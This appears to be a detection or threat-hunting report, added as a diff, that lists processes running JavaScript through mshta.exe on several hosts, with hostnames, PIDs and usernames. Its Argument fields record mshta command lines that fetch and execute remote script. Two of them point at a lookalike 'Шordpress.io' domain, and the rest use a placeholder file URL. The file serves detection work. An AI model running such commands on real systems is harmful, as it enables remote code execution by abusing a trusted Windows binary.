@@ -1,0 +1,96 @@
+
+==================================================
+Processes Running JavaScript Or VBScript
+==================================================
+Description:
+Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms 
+by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.
+==================================================
+
+Argument: javascript:a=(GetObject('http://www.Шordpress.io/cmd.js')).Exec();close()
+Hostname: 0002PKYWB
+Name: mshta.exe
+Path: C:\Program Files\mshta.exe
+PID: 1380
+Username: iri.jone4
+--------------------------------------------------
+
+Argument: javascript:a=(GetObject('http://www.Шordpress.io/cmd.js')).Exec();close()
+Hostname: 0002PKYWB
+Name: mshta.exe
+Path: C:\Program Files\mshta.exe
+PID: 1380
+Username: iri.jone4
+--------------------------------------------------
+
+Argument: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+Hostname: 0002RVTSN
+Name: mshta.exe
+Path: C:\Windows\System32\mshta.exe
+PID: 5652
+Username: NT AUTHORITY\SYSTEM
+--------------------------------------------------
+
+Argument: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+Hostname: 0002RVTSN
+Name: mshta.exe
+Path: C:\Windows\System32\mshta.exe
+PID: 5652
+Username: NT AUTHORITY\SYSTEM
+--------------------------------------------------
+
+Argument: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+Hostname: 0002RVTSN
+Name: mshta.exe
+Path: C:\Windows\System32\mshta.exe
+PID: 5652
+Username: NT AUTHORITY\SYSTEM
+--------------------------------------------------
+
+Argument: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+Hostname: 0004FXGWS
+Name: mshta.exe
+Path: C:\Windows\System32\mshta.exe
+PID: 1380
+Username: NT AUTHORITY\SYSTEM
+--------------------------------------------------
+
+Argument: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+Hostname: 0004FXGWS
+Name: mshta.exe
+Path: C:\Windows\System32\mshta.exe
+PID: 1380
+Username: NT AUTHORITY\SYSTEM
+--------------------------------------------------
+
+Argument: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+Hostname: 0004FXGWS
+Name: mshta.exe
+Path: C:\Windows\System32\mshta.exe
+PID: 1380
+Username: NT AUTHORITY\SYSTEM
+--------------------------------------------------
+
+Argument: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+Hostname: 0005JOFSS
+Name: mshta.exe
+Path: C:\Windows\System32\mshta.exe
+PID: 1296
+Username: NT AUTHORITY\SYSTEM
+--------------------------------------------------
+
+Argument: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+Hostname: 0005JOFSS
+Name: mshta.exe
+Path: C:\Windows\System32\mshta.exe
+PID: 1296
+Username: NT AUTHORITY\SYSTEM
+--------------------------------------------------
+
+Argument: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+Hostname: 0005JOFSS
+Name: mshta.exe
+Path: C:\Windows\System32\mshta.exe
+PID: 1296
+Username: NT AUTHORITY\SYSTEM
+--------------------------------------------------
